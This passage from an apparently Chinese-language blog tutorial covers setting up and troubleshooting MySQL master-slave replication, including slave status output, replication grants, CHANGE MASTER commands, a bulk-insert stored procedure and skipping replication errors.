class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: <br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000021</span><br>          Read_Master_Log_Pos: <span class="hljs-number">157</span><br>               Relay_Log_File: master<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000001</span><br>                Relay_Log_Pos: <span class="hljs-number">4</span><br>        Relay_Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000021</span><br>             Slave_IO_Running: <span class="hljs-keyword">No</span><br>            Slave_SQL_Running: <span class="hljs-keyword">No</span><br>            <br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> processlist;<br>IO线程<span class="hljs-operator">+</span><span class="hljs-keyword">SQL</span>线程，IO线程是从主节点接收同步信息，通过<span class="hljs-keyword">SQL</span> thread写入到从库的数据中，Query thread，显示waiting <span class="hljs-keyword">for</span> updates<br>主节点：binlog dump线程<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225924416-540222805.png" alt="img"></p><p><img src="2792175-20221007225924698-1789915929.png" alt="img"></p><h2 id="6-测试主从环境"><a href="#6-测试主从环境" class="headerlink" title="6.测试主从环境"></a>6.测试主从环境</h2><p>主写新，看从有无，可以执行存储过程</p><p>测试执行存储过程，从节点直接SQL thread断掉了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">6</span> <span class="hljs-operator">|</span> catyer2       <span class="hljs-operator">|</span>  <span class="hljs-number">17</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><br>##主节点写入新数据，删除数据，没了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##测试执行存储过程<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br></code></pre></td></tr></table></figure><h3 id="出现Slave-IO-Running-NO的解决办法：可能是用户没权限"><a href="#出现Slave-IO-Running-NO的解决办法：可能是用户没权限" class="headerlink" title="出现Slave_IO_Running: NO的解决办法：可能是用户没权限"></a>出现Slave_IO_Running: NO的解决办法：可能是用户没权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql">##复制账号没权限，从节点查看<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>Slave_IO_State: Waiting <span class="hljs-keyword">for</span> source <span class="hljs-keyword">to</span> send event<br>Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>Master_User: sync<br>Master_Port: <span class="hljs-number">3306</span><br>Connect_Retry: <span class="hljs-number">60</span><br>Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span><br>Read_Master_Log_Pos: <span class="hljs-number">60979553</span><br>Relay_Log_File: master<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000002</span><br>Relay_Log_Pos: <span class="hljs-number">326</span><br>Relay_Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span><br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br><br>##授权<br><span class="hljs-keyword">grant</span> replication slave <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush privileges;<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> sync@<span class="hljs-operator">%</span>                            <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> REPLICATION SLAVE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `sync`@`<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h3 id="出现Slave-SQL-Running：No的解决办法"><a href="#出现Slave-SQL-Running：No的解决办法" class="headerlink" title="出现Slave_SQL_Running：No的解决办法"></a>出现Slave_SQL_Running：No的解决办法</h3><p>重新执行一下slave的change master语句，记录下master的binlog pos，修改执行</p><p>可以查看日志，错误日志：mysql-error.log，可以自定义一下错误日志的位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sql">##从停止slave<br>stop slave;<br><br>##主查看binlog日志的pos<br><span class="hljs-keyword">show</span> master status;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span> <span class="hljs-operator">|</span> <span class="hljs-number">60979553</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><br>##从手动修改Pos,执行<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000784&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">197</span>;<br><br>##启动slave<br><span class="hljs-keyword">start</span> slave<br><br>##可能是表结构不一致，需要修改表结构字段<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-11</span>T03:<span class="hljs-number">39</span>:<span class="hljs-number">17.143632</span>Z <span class="hljs-number">28</span> [Warning] [MY<span class="hljs-number">-010584</span>] [Repl] Slave <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">for</span> channel <span class="hljs-string">&#x27;&#x27;</span>: ... The slave coordinator <span class="hljs-keyword">and</span> worker threads <span class="hljs-keyword">are</span> stopped, possibly leaving data <span class="hljs-keyword">in</span> inconsistent state. A restart should restore consistency automatically, although <span class="hljs-keyword">using</span> non<span class="hljs-operator">-</span>transactional storage <span class="hljs-keyword">for</span> data <span class="hljs-keyword">or</span> info tables <span class="hljs-keyword">or</span> DDL queries could lead <span class="hljs-keyword">to</span> problems. <span class="hljs-keyword">In</span> such cases you have <span class="hljs-keyword">to</span> examine your data (see documentation <span class="hljs-keyword">for</span> details). Error_code: MY<span class="hljs-number">-001756</span><br><br><span class="hljs-keyword">desc</span> testlog;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> testlog;<br></code></pre></td></tr></table></figure><h3 id="执行一个存储过程后SQL-running-NO的解决，通过show-master-status的报错查看"><a href="#执行一个存储过程后SQL-running-NO的解决，通过show-master-status的报错查看" class="headerlink" title="执行一个存储过程后SQL_running=NO的解决，通过show master status的报错查看"></a>执行一个存储过程后SQL_running=NO的解决，通过show master status的报错查看</h3><p><a href="https://www.cnblogs.com/Knight7971/p/9970807.html">https://www.cnblogs.com/Knight7971/p/9970807.html</a></p><p>主要是看errorlog来拍错，让我们看一下error log或者是performance_schema.replication_applier_status_by_worker，这个表来查看有什么原因导致的</p><p>在同步前，新的数据要是master节点存在，slave节点不存在的，就算是空表也不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs sql">##先看错误现象，SQL_RUNNING为<span class="hljs-keyword">NO</span>，让看看错误日志<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><br>Seconds_Behind_Master: <span class="hljs-number">21</span><br>Slave_SQL_Running: <span class="hljs-keyword">No</span><br>Last_Error: Coordinator stopped because there were error(s) <span class="hljs-keyword">in</span> the worker(s). The most recent failure being: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000023</span>, end_log_pos <span class="hljs-number">444.</span> <br>See error log <span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-keyword">or</span> performance_schema.replication_applier_status_by_worker <span class="hljs-keyword">table</span> <span class="hljs-keyword">for</span> more details about this failure <span class="hljs-keyword">or</span> others, if any.<br><br>##查看错误日志，好像是表的什么问题，再看下一个表<br>tail <span class="hljs-operator">-</span>f mysql.log<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-11</span>T03:<span class="hljs-number">34</span>:<span class="hljs-number">59.334704</span>Z <span class="hljs-number">23</span> [ERROR] [MY<span class="hljs-number">-013146</span>] [Repl] Slave <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">for</span> channel <span class="hljs-string">&#x27;&#x27;</span>: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span>, end_log_pos <span class="hljs-number">60979827</span>; <span class="hljs-keyword">Column</span> <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">table</span> <span class="hljs-string">&#x27;hellodb.testlog&#x27;</span> cannot be converted <span class="hljs-keyword">from</span> type <span class="hljs-string">&#x27;char(30(bytes))&#x27;</span> <span class="hljs-keyword">to</span> type <span class="hljs-string">&#x27;char(40(bytes) utf8mb4)&#x27;</span>, Error_code: MY<span class="hljs-number">-013146</span><br><br>##查出原因了，这个testlog表已经存在了，不能往里面写数据，在同步前，新的数据<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> performance_schema.replication_applier_status_by_worker\G;<br><br>LAST_ERROR_MESSAGE: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000023</span>, end_log_pos <span class="hljs-number">444</span>; <br>Error <span class="hljs-string">&#x27;Table &#x27;</span>testlog<span class="hljs-string">&#x27; already exists&#x27;</span> <span class="hljs-keyword">on</span> query. <span class="hljs-keyword">Default</span> database: <span class="hljs-string">&#x27;hellodb&#x27;</span>. Query: <span class="hljs-string">&#x27;create table testlog (id int auto_increment primary key,name char(30),salary int default 20) character set utf8mb4&#x27;</span><br><br>##删除掉表，停止slave，启动slave，修改MASTER信息<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> testlog;<br>stop slave;<br><br>##从手动修改Pos,执行<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000024&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br><span class="hljs-keyword">start</span> slave<br><br>##再次执行存储过程，在源端加点东西，先创建表<br>use hellodb;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> testlog (id <span class="hljs-type">int</span> auto_increment <span class="hljs-keyword">primary</span> key,name <span class="hljs-type">char</span>(<span class="hljs-number">30</span>),salary <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">20</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8mb4;<br><br>delimiter $$<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">procedure</span> sp_testlog() <br><span class="hljs-keyword">begin</span>  <br><span class="hljs-keyword">declare</span> i <span class="hljs-type">int</span>;<br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br>while i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">100000</span> <br>do  <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testlog(name,salary) <span class="hljs-keyword">values</span> (concat(<span class="hljs-string">&#x27;wang&#x27;</span>,<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">100000</span>)),<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">1000000</span>)); <br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> i <span class="hljs-operator">+</span><span class="hljs-number">1</span>; <br><span class="hljs-keyword">end</span> while; <br><span class="hljs-keyword">end</span>$$<br><br>delimiter ;<br><br>source <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>testlog.sql<br><span class="hljs-keyword">call</span> sp_testlog();<br><br>##从节点有<span class="hljs-number">21</span>s的复制同步延迟，已经优化很多了<br><span class="hljs-keyword">show</span> slave status \G;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">36626</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br>Seconds_Behind_Master: <span class="hljs-number">21</span><br><br>##完成执行存储过程的同步<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">100000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-number">49</span> <span class="hljs-operator">|</span> sync            <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:<span class="hljs-number">60752</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> Binlog Dump <span class="hljs-operator">|</span>  <span class="hljs-number">1475</span> <span class="hljs-operator">|</span> Source has sent <span class="hljs-keyword">all</span> binlog <span class="hljs-keyword">to</span> replica; waiting <span class="hljs-keyword">for</span> more updates <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span><br>wait <span class="hljs-keyword">for</span> events<br><br>ss <span class="hljs-operator">-</span>nt：查看已经建立的TCP连接，ESTABLISHED，<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:业务端口已建立<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225924957-393983908.png" alt="img"></p><p><img src="2792175-20221007225925256-1168084807.png" alt="img"></p><h2 id="7-同步堵塞-blocked-，序号冲突，跳过错误"><a href="#7-同步堵塞-blocked-，序号冲突，跳过错误" class="headerlink" title="7.同步堵塞(blocked)，序号冲突，跳过错误"></a>7.同步堵塞(blocked)，序号冲突，跳过错误</h2><p>跳过指定事件，跳过错误数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">show variables like &#x27;%sql_slave_skip_counter%&#x27;;<br><br>##跳过N个错误<br>set global sql_slave_skip_counter=N<br></code></pre></td></tr></table></figure><p>有时候，从节点没有设置为read-only只读，然后在从节点新增了记录，比如id=9，而主节点又新增记录，序号也为9，那么这个9和从节点的9就不是同一个问题，导致冲突，造成复制堵塞(blocked)，entity的记录冲突了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> slave status \G;<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br><br>##从节点写入一条记录，<span class="hljs-number">8</span>号记录<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;tea&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>); <br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">8</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span 